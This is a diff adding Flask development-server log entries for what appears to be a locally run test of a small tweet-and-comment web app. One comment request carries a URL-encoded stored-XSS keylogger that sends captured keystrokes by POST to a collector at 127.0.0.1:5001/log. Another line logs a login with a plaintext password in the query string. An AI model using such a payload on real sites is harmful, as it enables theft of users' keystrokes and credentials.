@@ -2436,3 +2436,40 @@ Press CTRL+C to quit ||SRC_IP=10.65.153.167
 127.0.0.1 - - [03/May/2026 13:26:40] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=10.65.153.167
 127.0.0.1 - - [03/May/2026 13:26:55] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=10.65.153.167
 127.0.0.1 - - [03/May/2026 13:27:13] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=10.65.153.167
+ * Serving Flask app 'app' ||SRC_IP=192.168.66.159
+ * Debug mode: on ||SRC_IP=192.168.66.159
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. ||SRC_IP=192.168.66.159
+ * Running on all addresses (0.0.0.0) ||SRC_IP=192.168.66.159
+ * Running on http://127.0.0.1:6001 ||SRC_IP=192.168.66.159
+ * Running on http://192.168.66.159:6001 ||SRC_IP=192.168.66.159
+Press CTRL+C to quit ||SRC_IP=192.168.66.159
+ * Restarting with watchdog (windowsapi) ||SRC_IP=192.168.66.159
+ * Debugger is active! ||SRC_IP=192.168.66.159
+ * Debugger PIN: 543-630-064 ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:07:56] GET / HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:07:56] GET /static/styles.css HTTP/1.1 304 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:07:56] GET /static/auth.js HTTP/1.1 304 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:07:56] GET /favicon.ico HTTP/1.1 404 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /api/login?username=pijus&password=Shuvojit%4012345 HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /main HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /static/styles.css HTTP/1.1 304 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /static/dashboard.js HTTP/1.1 304 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /api/me HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /api/profile HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:03] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:05] GET /api/tweets/3-1/comments/list HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:17] GET /api/tweets/3-1/comments?text=%3Cscript%3Elet+k%3D%27%27%3Bdocument.onkeydown%3De%3D%3E%7B%28k%2B%3De.key%2B%27+%27%29.length%3E50%26%26fetch%28%27http%3A%2F%2F127.0.0.1%3A5001%2Flog%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ak%7D%29%3B%7D%3C%2Fscript%3E HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:17] GET /api/tweets/3-1/comments/list HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:17] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:17] GET /api/profile HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:18] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+ * Detected change in 'C:\\Users\\User\\AppData\\Local\\Programs\\Python\\Python313\\Lib\\site-packages\\fastapi\\applications.py', reloading ||SRC_IP=192.168.66.159
+ * Restarting with watchdog (windowsapi) ||SRC_IP=192.168.66.159
+ * Debugger is active! ||SRC_IP=192.168.66.159
+ * Debugger PIN: 543-630-064 ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:34] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:08:49] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:09:04] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:09:19] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:09:34] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
+127.0.0.1 - - [04/May/2026 11:09:49] GET /api/tweets?q= HTTP/1.1 200 - ||SRC_IP=192.168.66.159
